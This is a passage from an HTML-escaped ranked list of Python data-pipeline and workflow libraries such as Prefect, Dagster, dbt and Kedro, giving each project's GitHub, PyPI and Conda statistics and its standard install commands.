· 🔀 2.3K · 📦 1.7K · 📋 970 - 10% open · ⏱️ 12.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/spotify/luigi&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/luigi&#34;&gt;PyPi&lt;/a&gt; (📥 580K / month · 📦 400 · ⏱️ 23.09.2020):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install luigi&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/anaconda/luigi&#34;&gt;Conda&lt;/a&gt; (📥 10K · 📦 2 · ⏱️ 02.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c anaconda luigi&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/PrefectHQ/prefect&#34;&gt;Prefect&lt;/a&gt;&lt;/b&gt; (🥇37 · ⭐ 9.2K) - The easiest way to automate your data. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/PrefectHQ/prefect&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 330 · 🔀 900 · 📦 790 · 📋 2.3K - 23% open · ⏱️ 24.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/PrefectHQ/prefect&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/prefect&#34;&gt;PyPi&lt;/a&gt; (📥 250K / month · 📦 64 · ⏱️ 24.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install prefect&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/prefect&#34;&gt;Conda&lt;/a&gt; (📥 260K · ⏱️ 28.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge prefect&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/great-expectations/great_expectations&#34;&gt;Great Expectations&lt;/a&gt;&lt;/b&gt; (🥇37 · ⭐ 6.6K) - Always know what to expect from your data. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/great-expectations/great_expectations&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 290 · 🔀 950 · 📋 1.3K - 15% open · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/great-expectations/great_expectations&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/great_expectations&#34;&gt;PyPi&lt;/a&gt; (📥 6.4M / month · 📦 32 · ⏱️ 19.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install great_expectations&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/great-expectations&#34;&gt;Conda&lt;/a&gt; (📥 380K · ⏱️ 19.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge great-expectations&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/dagster-io/dagster&#34;&gt;Dagster&lt;/a&gt;&lt;/b&gt; (🥇37 · ⭐ 4.8K) - An orchestration platform for the development, production, and.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/dagster-io/dagster&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 210 · 🔀 600 · 📦 380 · 📋 4.1K - 23% open · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/dagster-io/dagster&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/dagster&#34;&gt;PyPi&lt;/a&gt; (📥 280K / month · 📦 88 · ⏱️ 25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install dagster&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/dagster&#34;&gt;Conda&lt;/a&gt; (📥 510K · ⏱️ 22.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge dagster&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/joblib/joblib&#34;&gt;joblib&lt;/a&gt;&lt;/b&gt; (🥇37 · ⭐ 2.8K · 📉) - Computing with Python functions. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/joblib/joblib&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 110 · 🔀 320 · 📦 190K · 📋 730 - 45% open · ⏱️ 20.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/joblib/joblib&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/joblib&#34;&gt;PyPi&lt;/a&gt; (📥 25M / month · 📦 4.9K · ⏱️ 07.10.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install joblib&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/joblib&#34;&gt;Conda&lt;/a&gt; (📥 8.9M · ⏱️ 07.10.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge joblib&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/dbt-labs/dbt-core&#34;&gt;dbt&lt;/a&gt;&lt;/b&gt; (🥈36 · ⭐ 4.9K) - dbt enables data analysts and engineers to transform their data using the.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/dbt-labs/dbt-core&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 220 · 🔀 900 · 📥 360 · 📦 470 · 📋 2.8K - 12% open · ⏱️ 20.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/dbt-labs/dbt-core&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/dbt&#34;&gt;PyPi&lt;/a&gt; (📥 1.5M / month · 📦 30 · ⏱️ 06.12.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install dbt&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/dbt&#34;&gt;Conda&lt;/a&gt; (📥 200K · ⏱️ 09.12.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge dbt&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/kedro-org/kedro&#34;&gt;Kedro&lt;/a&gt;&lt;/b&gt; (🥈35 · ⭐ 7.2K) - A Python framework for creating reproducible, maintainable and modular.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/kedro-org/kedro&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 150 · 🔀 660 · 📦 870 · 📋 770 - 14% open · ⏱️ 25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/kedro-org/kedro&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/kedro&#34;&gt;PyPi&lt;/a&gt; (📥 320K / month · 📦 38 · ⏱️ 09.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install kedro&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/activeloopai/Hub&#34;&gt;Activeloop&lt;/a&gt;&lt;/b&gt; (🥈31 · ⭐ 4.5K) - Dataset format for AI. Build, manage, query &amp;amp; visualize datasets.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3postzC&#34;&gt;MPL-2.0&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/activeloopai/Hub&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 97 · 🔀 380 · 📋 370 - 14% open · ⏱️ 24.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/activeloopai/Hub&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/hub&#34;&gt;PyPi&lt;/a&gt; (📥 5.6K / month · 📦 53 · ⏱️ 18.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install hub&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/coleifer/huey&#34;&gt;huey&lt;/a&gt;&lt;/b&gt; (🥈31 · ⭐ 4K) - a little task queue for python. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/coleifer/huey&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 66 · 🔀 330 · 📦 930 · 📋 510 - 0% open · ⏱️ 09.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/coleifer/huey&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/huey&#34;&gt;PyPi&lt;/a&gt; (📥 170K / month · 📦 160 · ⏱️ 28.12.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install huey&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/huey&#34;&gt;Conda&lt;/a&gt; (📥 24K · ⏱️ 16.10.2019):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge huey&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/ploomber/ploomber&#34;&gt;ploomber&lt;/a&gt;&lt;/b&gt; (🥈31 · ⭐ 2.4K) - The fastest way to build data pipelines. Develop iteratively,.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/ploomber/ploomber&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 48 · 🔀 160 · 📦 42 · 📋 700 - 27% open · ⏱️ 24.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/ploomber/ploomber&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/ploomber&#34;&gt;PyPi&lt;/a&gt; (📥 4.2K / month · 📦 5 · ⏱️ 22.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install ploomber&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/ploomber&#34;&gt;Conda&lt;/a&gt; (📥 7.4K · ⏱️ 22.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge ploomber&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/tensorflow/tfx&#34;&gt;TFX&lt;/a&gt;&lt;/b&gt; (🥈31 · ⭐ 1.8K) - TFX is an end-to-end platform for deploying production ML pipelines. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/tensorflow/tfx&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 140 · 🔀 580 · 📋 770 - 32% open · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/tensorflow/tfx&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/tfx&#34;&gt;PyPi&lt;/a&gt; (📥 360K / month · 📦 12 · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install tfx&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/combust/mleap&#34;&gt;mleap&lt;/a&gt;&lt;/b&gt; (🥈31 · ⭐ 1.4K) - MLeap: Deploy ML Pipelines to Production. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/combust/mleap&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 73 · 🔀 300 · 📦 180 · 📋 440 - 20% open · ⏱️ 03.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/combust/mleap&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/mleap&#34;&gt;PyPi&lt;/a&gt; (📥 230K / month · 📦 26 · ⏱️ 04.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install mleap&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/mleap&#34;&gt;Conda&lt;/a&gt; (📥 47K · ⏱️ 05.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge mleap&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/petl-developers/petl&#34;&gt;petl&lt;/a&gt;&lt;/b&gt; (🥈31 · ⭐ 1K) - Python Extract Transform and Load Tables of Data. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/petl-developers/petl&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 54 · 🔀 170 · 📦 720 · 📋 440 - 17% open · ⏱️ 25.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/petl-developers/petl&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/petl&#34;&gt;PyPi&lt;/a&gt; (📥 190K / month · 📦 74 · ⏱️ 25.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install petl&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/petl&#34;&gt;Conda&lt;/a&gt; (📥 76K · ⏱️ 26.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge petl&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/zenml-io/zenml&#34;&gt;zenml&lt;/a&gt;&lt;/b&gt; (🥉27 · ⭐ 2K) - ZenML : Build portable, production-ready MLOps pipelines... &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/zenml-io/zenml&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 32 · 🔀 160 · 📋 86 - 24% open · ⏱️ 25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/zenml-io/zenml&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/zenml&#34;&gt;PyPi&lt;/a&gt; (📥 1.4K / month · ⏱️ 24.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install zenml&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/hi-primus/optimus&#34;&gt;Optimus&lt;/a&gt;&lt;/b&gt; (🥉27 · ⭐ 1.2K) - Agile Data Preparation Workflows madeeasy with Pandas, Dask,.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1N&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/hi-primus/optimus&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 25 · 🔀 210 · 📋 230 - 13% open · ⏱️ 04.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/hi-primus/optimus&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/optimuspyspark&#34;&gt;PyPi&lt;/a&gt; (📥 47K / month · ⏱️ 30.05.2019):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install optimuspyspark&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/EntilZha/PyFunctional&#34;&gt;PyFunctional&lt;/a&gt;&lt;/b&gt; (🥉26 · ⭐ 2K) - Python library for creating data pipelines with chain functional.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/EntilZha/PyFunctional&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 25 · 🔀 120 · 📦 440 · 📋 130 - 6% open · ⏱️ 05.11.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/EntilZha/PyFunctional&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/pyfunctional&#34;&gt;PyPi&lt;/a&gt; (📥 110K / month · 📦 15 · ⏱️ 12.01.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install pyfunctional&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/Parsely/streamparse&#34;&gt;streamparse&lt;/a&gt;&lt;/b&gt; (🥉26 · ⭐ 1.5K) - Run Python in Apache Storm topologies. Pythonic API, CLI.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/Parsely/streamparse&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 42 · 🔀 220 · 📦 54 · 📋 330 - 21% open · ⏱️ 10.01.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/Parsely/streamparse&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/streamparse&#34;&gt;PyPi&lt;/a&gt; (📥 3.8K / month · 📦 27 · ⏱️ 10.01.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install streamparse&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/samuelcolvin/arq&#34;&gt;arq&lt;/a&gt;&lt;/b&gt; (🥉26 · ⭐ 1.2K) - Fast job queuing and RPC in python with asyncio and redis. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/samuelcolvin/arq&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 39 · 🔀 100 · 📦 230 · 📋 140 - 26% open · ⏱️ 28.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/samuelcolvin/arq&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/arq&#34;&gt;PyPi&lt;/a&gt; (📥 23K / month · 📦 11 · ⏱️ 09.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install arq&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/arq&#34;&gt;Conda&lt;/a&gt; (📥 2.2K · ⏱️ 03.09.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge arq&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/whylabs/whylogs&#34;&gt;whylogs&lt;/a&gt;&lt;/b&gt; (🥉25 · ⭐ 1.1K) - Open standard for end-to-end data and ML monitoring for any scale in.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/whylabs/whylogs&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 32 · 🔀 56 · 📥 50 · 📋 160 - 39% open · ⏱️ 24.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/whylabs/whylogs&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/whylogs&#34;&gt;PyPi&lt;/a&gt; (📥 16K / month · 📦 2 · ⏱️ 25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install whylogs&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/closeio/tasktiger&#34;&gt;TaskTiger&lt;/a&gt;&lt;/b&gt; (🥉24 · ⭐ 1.1K) - Python task queue using Redis. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/closeio/tasktiger&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 25 · 🔀 62 · 📦 22 · 📋 68 - 48% open · ⏱️ 25.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/closeio/tasktiger&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/tasktiger&#34;&gt;PyPi&lt;/a&gt; (📥 1.3K / month · 📦 10 · ⏱️ 02.12.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install tasktiger&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/cgarciae/pypeln&#34;&gt;Pypeline&lt;/a&gt;&lt;/b&gt; (🥉23 · ⭐ 1.3K) - Concurrent data pipelines in Python . &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/cgarciae/pypeln&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 12 · 🔀 80 · 📋 58 - 25% open · ⏱️ 06.01.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/cgarciae/pypeln&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/pypeln&#34;&gt;PyPi&lt;/a&gt; 